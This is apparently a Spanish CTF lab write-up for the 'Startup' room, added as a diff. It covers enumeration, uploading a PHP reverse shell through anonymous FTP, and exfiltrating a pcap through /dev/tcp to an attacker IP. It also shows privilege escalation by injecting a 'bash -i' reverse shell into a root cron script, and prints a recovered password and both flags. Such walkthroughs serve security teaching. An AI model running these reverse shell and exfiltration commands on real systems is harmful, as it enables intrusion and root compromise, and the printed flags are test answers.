@@ -1,0 +1,352 @@
+---
+layout: default
+---
+
+# Startup CTF
+
+![Startup CTF](/imagenes/Startup.png)
+
+---
+
+## Fase 1 — Enumeración
+
+### Fase 1.1 — Nmap Port Scan
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA ATACANTE]
+nmap -sC -sV -oN startup.nmap 10.130.150.253
+```
+
+**Puertos descubiertos:**
+
+| Puerto | Servicio | Versión |
+|--------|----------|---------|
+| 21/tcp | FTP | vsftpd 3.0.3 |
+| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |
+| 80/tcp | HTTP | Apache 2.4.18 Ubuntu |
+
+**Hallazgos:**
+- FTP → **Anonymous login allowed** 🔴
+- FTP → Directorio con permisos de escritura 🔴
+- FTP → Archivos: `important.jpg` y `notice.txt`
+- HTTP → Título: **Maintenance**
+
+![fase1.1_nmap_scan.png](fase1.1_nmap_scan.png)
+
+---
+
+### Fase 1.2 — Enumeración FTP Anónimo
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA ATACANTE]
+ftp 10.130.150.253
+# Usuario: anonymous
+# Password: (vacío)
+ls -la
+```
+
+**Hallazgos:**
+- `.test.log` → Archivo oculto
+- `ftp/` → Directorio con permisos de escritura
+- `important.jpg` y `notice.txt` → Descargados para análisis
+- `notice.txt` → Menciona usuario **Maya** → posible usuario del sistema
+
+![fase1.2_ftp_anonymous.png](fase1.2_ftp_anonymous.png)
+
+---
+
+**Descarga y lectura de archivos FTP:**
+```bash
+# [MÁQUINA ATACANTE - sesión FTP]
+get .test.log
+get important.jpg
+get notice.txt
+exit
+
+# [MÁQUINA ATACANTE]
+cat .test.log
+cat notice.txt
+```
+
+**Hallazgos:**
+- `.test.log` → Contenido: `test`
+- `notice.txt` → Usuario **Maya** identificado
+
+![fase1.2_ftp_files.png](fase1.2_ftp_files.png)
+
+---
+
+### Fase 1.3 — Enumeración Web
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA ATACANTE]
+gobuster dir -u http://10.130.150.253 \
+             -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+             -x php,txt,html \
+             -t 50
+```
+
+**Directorios descubiertos:**
+- `/files` → Status 301 🔴
+- `/server-status` → Status 403
+
+**Hallazgo crítico:**
+- `/files/ftp/` → El directorio FTP es accesible desde la web → podemos subir una reverse shell por FTP y ejecutarla desde el navegador
+
+![fase1.3_gobuster_80.png](fase1.3_gobuster_80.png)
+
+---
+
+## Fase 2 — Foothold
+
+### Fase 2.1 — Upload de Reverse Shell vía FTP
+
+**Paso 1 — Preparar la shell:**
+```bash
+# [MÁQUINA ATACANTE]
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+nano shell.php
+# Cambiar: $ip = '192.168.143.6' y $port = 4444
+```
+
+![fase2.1_shell_php.png](fase2.1_shell_php.png)
+
+---
+
+**Paso 2 — Subir la shell por FTP:**
+```bash
+# [MÁQUINA ATACANTE]
+ftp 10.130.150.253
+# Usuario: anonymous / Password: vacío
+cd ftp
+put shell.php
+exit
+```
+
+![fase2.1_ftp_upload_shell.png](fase2.1_ftp_upload_shell.png)
+
+---
+
+### Fase 2.2 — Ejecución de Reverse Shell
+
+**Paso 1 — Listener en Kali:**
+```bash
+# [MÁQUINA ATACANTE]
+nc -lvnp 4444
+```
+
+**Paso 2 — Ejecutar desde el navegador:**
+```
+http://10.130.150.253/files/ftp/shell.php
+```
+
+**Hallazgos:**
+- Reverse shell recibida como `www-data`
+
+![fase2.2_reverse_shell.png](fase2.2_reverse_shell.png)
+
+---
+
+### Fase 2.3 — Estabilización y Enumeración Interna
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA OBJETIVO]
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+find / -name "*.txt" 2>/dev/null | grep -v proc
+```
+
+**Hallazgo crítico:**
+- `/recipe.txt` → Respuesta a la pregunta del room
+
+![fase2.3_find_flags.png](fase2.3_find_flags.png)
+
+---
+
+**Lectura de recipe.txt:**
+```bash
+# [MÁQUINA OBJETIVO]
+cat /recipe.txt
+```
+
+**Hallazgo:**
+- `recipe.txt` → *"the secret ingredient is love"*
+
+![fase2.3_recipe_txt.png](fase2.3_recipe_txt.png)
+
+---
+
+## Fase 3 — Movimiento Lateral → lennie
+
+### Fase 3.1 — Descubrimiento del PCAP
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA OBJETIVO]
+ls -la /incidents/
+```
+
+**Hallazgos:**
+- `/incidents/` → Directorio propiedad de `www-data`
+- `suspicious.pcapng` → Captura de red sospechosa con credenciales
+
+![fase3.1_enum_internal.png](fase3.1_enum_internal.png)
+
+---
+
+**Intento de lectura directa:**
+```bash
+# [MÁQUINA OBJETIVO]
+cat /incidents/suspicious.pcapng | grep -a "pass\|lennie\|login"
+```
+
+![fase3.1_pcap_strings.png](fase3.1_pcap_strings.png)
+
+---
+
+### Fase 3.2 — Transferencia del PCAP a Kali
+
+**Paso 1 — Listener en Kali:**
+```bash
+# [MÁQUINA ATACANTE]
+nc -lvnp 5555 > suspicious.pcapng
+```
+
+**Paso 2 — Envío desde el objetivo:**
+```bash
+# [MÁQUINA OBJETIVO]
+cat /incidents/suspicious.pcapng > /dev/tcp/192.168.143.6/5555
+```
+
+![fase3.2_nc_transfer_pcap.png](fase3.2_nc_transfer_pcap.png)
+
+![fase3.2_cat_pcap_objetivo.png](fase3.2_cat_pcap_objetivo.png)
+
+---
+
+### Fase 3.3 — Análisis con Wireshark — TCP Stream 7
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA ATACANTE]
+wireshark suspicious.pcapng
+```
+
+**Pasos en Wireshark:**
+1. Clic derecho en paquete TCP → `Follow` → `TCP Stream`
+2. Navegar hasta el **Stream 7**
+
+**Hallazgo crítico:**
+- Un atacante anterior intentó autenticarse como `www-data` con `sudo` y escribió la contraseña de `lennie` en el prompt equivocado
+- **Contraseña obtenida: `c4ntg3t3n0ughsp1c3`**
+
+![fase3.3_wireshark_stream7.png](fase3.3_wireshark_stream7.png)
+
+---
+
+### Fase 3.4 — Acceso SSH como lennie
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA ATACANTE]
+ssh lennie@10.130.150.253
+# Password: c4ntg3t3n0ughsp1c3
+```
+
+![fase3.4_ssh_lennie.png](fase3.4_ssh_lennie.png)
+
+---
+
+### Fase 3.5 — User Flag
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA OBJETIVO - como lennie]
+cat /home/lennie/user.txt
+```
+
+**User Flag:**
+```
+THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
+```
+
+![fase3.5_user_flag.png](fase3.5_user_flag.png)
+
+---
+
+## Fase 4 — Escalada de Privilegios
+
+### Fase 4.1 — Identificación del Vector PrivEsc (Cronjob)
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA OBJETIVO - como lennie]
+cat /home/lennie/scripts/planner.sh
+cat /etc/print.sh
+ls -la /home/lennie/scripts/
+ls -la /etc/print.sh
+```
+
+**Hallazgos:**
+
+| Archivo | Propietario | Permisos |
+|---------|-------------|----------|
+| `planner.sh` | root | Ejecutado por root vía cronjob cada minuto |
+| `startup_list.txt` | root | Modificado cada minuto |
+| `/etc/print.sh` | **lennie** | **rwx — escribible por nosotros** |
+
+**Vector:** `planner.sh` (root) llama a `/etc/print.sh` (lennie) → inyectamos reverse shell → RCE como root
+
+![fase4.1_privesc_enum.png](fase4.1_privesc_enum.png)
+
+---
+
+### Fase 4.2 — Inyección de Reverse Shell en print.sh
+
+**Paso 1 — Listener en Kali:**
+```bash
+# [MÁQUINA ATACANTE]
+nc -lvnp 6666
+```
+
+**Paso 2 — Inyectar reverse shell:**
+```bash
+# [MÁQUINA OBJETIVO - como lennie]
+echo "bash -i >& /dev/tcp/192.168.143.6/6666 0>&1" >> /etc/print.sh
+cat /etc/print.sh
+```
+
+**Esperar máximo 1 minuto** a que el cronjob de root ejecute `planner.sh` → llama a `print.sh` → reverse shell recibida.
+
+![fase4.2_inject_printsh.png](fase4.2_inject_printsh.png)
+
+---
+
+### Fase 4.3 — Shell como Root
+
+**Hallazgos:**
+- Conexión recibida desde `10.130.176.228` como `root`
+
+![fase4.3_root_shell_recibida.png](fase4.3_root_shell_recibida.png)
+
+---
+
+### Fase 4.4 — Root Flag
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA OBJETIVO - como ROOT]
+whoami
+cat /root/root.txt
+```
+
+**Root Flag:**
+```
+THM{f963aaa6a430f210222158ae15c3d76d}
+```
+
+![fase4.4_root_flag.png](fase4.4_root_flag.png)
